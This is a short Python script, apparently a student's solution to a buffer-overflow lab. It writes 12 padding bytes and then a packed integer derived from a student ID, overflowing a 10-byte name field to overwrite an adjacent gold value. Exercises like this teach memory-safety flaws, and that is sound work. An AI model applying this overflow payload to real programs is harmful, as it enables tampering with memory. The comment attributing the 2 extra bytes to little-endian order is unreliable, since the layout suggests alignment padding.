# unsigned int hp -> 4 bytes
# char name[10] -> 10 bytes
# unsigned int gold -> 4 bytes

import struct
import sys

SID = '510427586'

# Exploit requires last 4 chars
TO_ATTACH = int(SID[-4:])

# We need to overflow 12 bytes (10 for the name & the first 2 bytes of gold will be ignored due to little-endian)
padding = b'0' * 12
bs = struct.pack('i', TO_ATTACH)
sys.stdout.buffer.write(padding + bs)